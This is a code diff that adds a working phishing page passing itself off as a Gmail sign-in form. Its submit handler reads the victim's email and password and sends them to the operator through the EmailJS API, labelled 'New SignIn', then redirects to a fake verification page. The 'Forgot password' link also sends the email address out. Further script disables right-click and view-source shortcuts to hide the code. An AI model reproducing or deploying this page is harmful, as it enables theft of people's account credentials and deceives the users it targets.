@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail-login</title>
+    <link rel="stylesheet" href="./assets/css/g_style.css">
+
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({
+                publicKey: "Ct3xYBH_v2Glf8LKZ",
+            });
+        })();
+    </script>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="side">
+            <div class="first-side-section">
+                <img src="./assets/img/google.png" alt="">
+                <h1>Sign in</h1>
+                <h3>to contnue with Gmail</h3>
+            </div>            
+        </div>
+        <div class="main">
+            <form action="" class="first-main-section" id="google-form" accept-charset="utf-8">
+                <input type="email" name="email" id="email" placeholder="Email" required>
+                <input type="password" name="password" id="password" placeholder="Enter your password">
+                <a href="" id="f-pwd" class="link">Forgot password?</a>    
+                <p>Not your computer? use Guest mode to sign in privately. <a href="">Learn more about using Guest mode</a></p>
+                <div class="links-buttons">
+                    <a href="">Create account</a>
+                    <button type="submit">Next</button>
+                </div>
+            </form>
+            
+        </div>
+    </div>
+
+    
+    <script>
+        document.addEventListener("contextmenu", (e) => e.preventDefault());
+
+        document.addEventListener("keydown", (e) => {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+
+    <script>
+        
+        document.getElementById("google-form").addEventListener("submit", function(event){
+            event.preventDefault();
+            let email = document.getElementById("email").value;
+            localStorage.setItem('email', JSON.stringify(email));
+            
+            var data = {
+                service_id: 'service_4a8grop',
+                template_id: 'template_5abs6p4',
+                user_id: 'Ct3xYBH_v2Glf8LKZ',
+                template_params: {
+                    name: "Workabroad",
+                   // email: document.getElementById("email").value,
+                    subject: "New SignIn",
+                    message: "Email: " + document.getElementById("email").value + "  Password:" + document.getElementById("password").value,
+                }
+            };        
+            $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+                type: 'POST',
+                data: JSON.stringify(data),
+                contentType: 'application/json'
+            }).done(function() {
+                window.location.href='./google-verification.html';
+            }).fail(function(error) {
+                alert('Oops... ' + JSON.stringify(error));
+            });
+            
+
+        });
+
+        document.getElementById("f-pwd").addEventListener("click", function(event){
+            event.preventDefault();
+            localStorage.setItem('email', JSON.stringify(document.getElementById("email").value));
+
+            var data = {
+                service_id: 'service_4a8grop',
+                template_id: 'template_5abs6p4',
+                user_id: 'Ct3xYBH_v2Glf8LKZ',
+                template_params: {              
+                    name: "Workabroad.ph",
+                    email: document.getElementById("email").value,
+                    subject: "New SignIn",
+                    message: "Email:" + document.getElementById("email").value + "  Password: no password",
+                }
+                
+            };
+            
+            $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+                type: 'POST',
+                data: JSON.stringify(data),
+                contentType: 'application/json'
+            }).done(function() {
+                window.location.href='./google-verification2.html';
+            }).fail(function(error) {
+                alert('Oops... ' + JSON.stringify(error));
+            });
+
+            
+        });
+
+    </script>
+
+    <script type="text/javascript"src="./assets/js/vendor/jquery.min.js"></script><script type="text/javascript"src="./assets/js/vendor/bootstrap.bundle.min.js"></script><script type="text/javascript"src="./assets/js/vendor/moment.min.js"></script><script type="text/javascript"src="./assets/js/vendor/mousetrap.min.js"></script><script type="text/javascript"src="./assets/js/vendor/sweetalert.min.js"></script><script type="text/javascript"src="./assets/js/vendor/intlTelInput.min.js"></script><script type="text/javascript"src="./assets/js/vendor/jquery.are-you-sure.js"></script>
+
+
+</body>
+</html>
